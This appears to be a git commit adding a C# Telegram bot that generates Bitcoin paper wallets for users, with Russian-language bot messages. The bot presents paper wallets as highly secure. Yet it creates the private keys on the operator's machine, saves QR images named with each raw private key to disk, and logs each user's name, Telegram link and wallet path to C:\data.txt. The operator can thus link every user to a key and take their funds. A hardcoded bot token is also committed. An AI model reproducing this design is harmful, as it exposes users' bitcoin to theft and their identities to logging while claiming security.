6dcf50be7a703d74a57e3b24dfaece0e2e47cdf0
mechark <targaryen1886@gmail.com>
2021-03-08 19:07:55 +0300

    bpw-0

---
+++ BitcoinPaperWallet/Program.cs
@@ -0,0 +1,80 @@
+﻿using System;
+using System.Text;
+using System.Collections.Generic;
+using System.IO;
+using Telegram.Bot;
+using Telegram.Bot.Args;
+using Telegram.Bot.Types.InputFiles;
+using PaperWallet;
+
+namespace BitcoinPaperWallet
+{
+
+    class Program
+    {
+        private static TelegramBotClient botClient = new TelegramBotClient("1667879967:AAG61Cj-V7WxbdJ_nyctQabDneslM9SgBvw");
+
+        static void Main(string[] args)
+        {
+            botClient.OnMessage += Bot_OnMessage;
+            botClient.StartReceiving();
+            
+            Console.ReadKey();
+
+            botClient.StopReceiving();
+        }
+
+        async public static void Bot_OnMessage(object sender, MessageEventArgs e)
+        {
+            string wallet = PaperWallet.PaperWallet.generatePaperWallet(PaperWallet.PaperWallet.generateKeys());
+
+            if (e.Message.Text != null)
+            { 
+                Console.WriteLine(e.Message.Chat.FirstName);
+                Console.WriteLine(e.Message.Chat.LastName);
+                Console.WriteLine(e.Message.Chat.Username);
+                Console.WriteLine(e.Message.Chat.Id);
+                Console.WriteLine(e.Message.Chat.InviteLink);
+                Console.WriteLine("********************************************");
+            }
+
+            if (e.Message.Text == "/start")
+            {
+                await botClient.SendTextMessageAsync(
+                    chatId: e.Message.Chat.Id,
+                    text: $"Привет {e.Message.Chat.FirstName}, для того чтобы сгенерировать кошелёк нажмите /generatepaperwallet"
+                );
+
+            }
+
+            if (e.Message.Text == "/explanation")
+            {
+                await botClient.SendTextMessageAsync(
+                    chatId: e.Message.Chat.Id,
+                    text:
+                    "Ваш бумажный кошелек состоит из пары закрытых и открытых ключей, которые отображаются в виде длинной последовательности цифр и букв, а также соответствующих им QR-кодов. Публичный ключ(открытый) - адрес Вашего кошелька, которым вы можете делиться со всеми для приёма платежей. Приватный ключ(закрытый) должен быть известен только вам. С помощью приватного ключа Вы можете переводить биткоины на другой счёт и т.п. Бумажный кошелёк - это один из самых надёжных способов хранения Bitcoin."
+                );
+            }
+
+            if (e.Message.Text == "/generatepaperwallet")
+            {
+                using (FileStream fs = File.OpenRead(wallet))
+                {
+                    InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "wallet.png");
+                    await botClient.SendDocumentAsync(e.Message.Chat.Id, inputOnlineFile);
+                    fs.Close();
+                }
+
+                FileInfo fi = new FileInfo(@"C:\data.txt");
+                using (StreamWriter sw = fi.AppendText())
+                {
+                    sw.WriteLine(e.Message.Chat.FirstName);
+                    sw.WriteLine("https://t.me/" + e.Message.Chat.Username);
+                    sw.WriteLine(wallet);
+                    sw.WriteLine("********************************************");
+                }
+
+            }
+        }
+    }
+}
---
+++ PaperWallet/PaperWallet.cs
@@ -0,0 +1,57 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Drawing;
+using NBitcoin;
+using QRCoder;
+
+namespace PaperWallet
+{
+    public class PaperWallet
+    {
+        public static string[] generateKeys()
+        {
+            Key privKey = new Key();
+            BitcoinSecret mainNetPrivateKey = privKey.GetBitcoinSecret(Network.Main);
+            PubKey pubKey = privKey.PubKey;
+            string[] Keys = new string[2];
+            Keys[0] = mainNetPrivateKey.ToString();
+            Keys[1] = pubKey.GetAddress(ScriptPubKeyType.Legacy, Network.Main).ToString();
+            return Keys;
+        }
+
+        public static string generatePaperWallet(string[] keys)
+        {
+            List<string> QRCodesImages = new List<string>();
+            foreach (string key in keys)
+            {
+                var generator = new PayloadGenerator.BitcoinAddress(key.ToString(), 0);
+                string payload = generator.ToString();
+
+                QRCodeGenerator qrGenerator = new QRCodeGenerator();
+                QRCodeData qrCodeData = qrGenerator.CreateQrCode(payload, QRCodeGenerator.ECCLevel.Q);
+                QRCode qrCode = new QRCode(qrCodeData);
+                var qrCodeAsBitmap = qrCode.GetGraphic(8);
+                qrCodeAsBitmap.Save(@"C:\PaperWalletImages\QRCode" + key + ".png");
+
+                QRCodesImages.Add(@"C:\PaperWalletImages\QRCode" + key + ".png");
+                QRCodesImages.Add(key.ToString());
+            }
+
+            Image instanceImg = Bitmap.FromFile(@"C:\PaperWalletInstance.jpg");
+            Image privKey = Bitmap.FromFile(QRCodesImages[0]);
+            Image pubKey = Bitmap.FromFile(QRCodesImages[2]);
+            Graphics i = Graphics.FromImage(instanceImg);
+
+            i.DrawImage(pubKey, 0, 370);
+            i.DrawImage(privKey, 2300, 300);
+            i.DrawString(QRCodesImages[1], new Font("Arial", (float)13.5),
+            new SolidBrush(Color.Black), 1730, 1450);
+            i.DrawString(QRCodesImages[3], new Font("Arial", (float)15),
+            new SolidBrush(Color.Black), 0, 1450);
+
+            instanceImg.Save(@"C:\PaperWalletImages\outer" + QRCodesImages[1] + ".jpg");
+
+            return @"C:\PaperWalletImages\outer" + QRCodesImages[1] + ".jpg";
+        }
+    }
+}
